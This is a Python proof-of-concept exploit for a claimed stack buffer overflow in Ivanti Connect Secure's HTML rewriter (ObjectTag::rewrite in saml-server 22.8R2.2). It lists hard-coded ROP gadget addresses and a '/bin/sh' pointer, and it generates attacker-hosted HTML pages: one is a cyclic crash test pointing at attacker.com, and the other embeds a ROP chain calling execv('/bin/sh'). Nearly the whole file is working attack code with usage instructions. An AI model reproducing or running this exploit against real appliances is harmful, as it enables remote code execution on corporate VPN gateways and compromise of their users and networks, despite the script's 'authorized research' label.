#!/usr/bin/env python3
"""
Ivanti Connect Secure — ObjectTag::rewrite sprintf Stack Buffer Overflow PoC

Target: saml-server (22.8R2.2) — NO Canary, NO PIE (base 0x08048000)
        Also affects web process in 22.7R2.x when used as proxy

Vulnerability:
  ObjectTag::rewrite() in libdslibs.so uses sprintf() with %s format
  to write a user-controlled URL into a dynamically-sized stack buffer.

  Format string: "<param name='neoteris-doc-base' value='%s' />"

  If the URL exceeds the allocated stack buffer, it overwrites the
  saved registers and return address.

Attack Scenario:
  1. Attacker hosts a malicious web page with an <object> tag
  2. Authenticated VPN user accesses the page through Ivanti Web Proxy
  3. Ivanti's HTML rewriter processes the <object> tag
  4. ObjectTag::rewrite() calls sprintf() with the attacker's URL
  5. Stack buffer overflow → RCE

ROP Chain (saml-server 22.8R2.2):
  Base address: 0x08048000 (NO PIE)
  execv@plt:   0x080b6700
  popen@plt:   0x080b6390
  "/bin/sh":   0x081c5701

  pop ebx; pop esi; pop edi; pop ebp; ret → 0x080b7393
  pop ebp; ret → 0x080b7396

Note: This is a PROOF OF CONCEPT for authorized security research.
      Dynamic stack allocation (sub %edx, %esp) means the exact overflow
      offset depends on the runtime value of %edx, which varies based on
      the HTML content being processed. Exploitation requires determining
      the exact buffer size allocated for each request.
"""

import struct
import sys

# Target: saml-server 22.8R2.2 (no PIE, no canary)
SAML_BASE = 0x08048000

# ROP Gadgets
POP_EBX_ESI_EDI_EBP_RET = 0x080b7393
POP_EBP_RET = 0x080b7396
EXECV_PLT = 0x080b6700
POPEN_PLT = 0x080b6390
BIN_SH = 0x081c5701  # "/bin/sh" in .rodata

def generate_malicious_html(overflow_size=512):
    """Generate HTML with <object> tag containing overflow URL for crash testing"""
    from pwn import cyclic
    crash_test_url = cyclic(overflow_size).decode()

    html = f"""<!DOCTYPE html>
<html>
<head><title>Test Page</title></head>
<body>
<h1>Loading content...</h1>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        width="1" height="1"
        data="http://attacker.com/{crash_test_url}">
  <param name="src" value="http://attacker.com/{crash_test_url}" />
  <param name="movie" value="http://attacker.com/{crash_test_url}" />
</object>
</body>
</html>"""
    return html


def generate_exploit_html(offset_to_ret):
    """Generate exploit HTML with ROP chain"""
    padding = b"B" * offset_to_ret

    rop = b""
    rop += struct.pack("<I", POP_EBX_ESI_EDI_EBP_RET)
    rop += struct.pack("<I", BIN_SH)
    rop += struct.pack("<I", 0x00000000)
    rop += struct.pack("<I", 0x00000000)
    rop += struct.pack("<I", 0x00000000)
    rop += struct.pack("<I", EXECV_PLT)
    rop += struct.pack("<I", 0x41414141)
    rop += struct.pack("<I", BIN_SH)
    rop += struct.pack("<I", 0x00000000)

    url = (padding + rop).decode('latin-1')
    html = f"""<!DOCTYPE html>
<html><body>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
  <param name="src" value="http://x/{url}" />
</object>
</body></html>"""
    return html


if __name__ == "__main__":
    print("=== Ivanti ObjectTag::rewrite PoC ===")
    print(f"Target: saml-server 22.8R2.2")
    print(f"Base:   0x{SAML_BASE:08x}")
    print(f"execv:  0x{EXECV_PLT:08x}")
    print(f"/bin/sh: 0x{BIN_SH:08x}")

    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        offset = int(sys.argv[3]) if len(sys.argv) > 3 else 200
        html = generate_exploit_html(offset)
        with open("/tmp/ivanti_exploit.html", "w") as f:
            f.write(html)
        print(f"[+] Exploit HTML written to /tmp/ivanti_exploit.html (offset={offset})")
    else:
        html = generate_malicious_html(1024)
        with open("/tmp/ivanti_poc.html", "w") as f:
            f.write(html)
        print("[+] Crash test HTML written to /tmp/ivanti_poc.html")
        print("[+] Host on web server, access through Ivanti Web Proxy")
        print("[*] For exploit: python3 poc_objecttag_overflow.py --exploit --offset <N>")
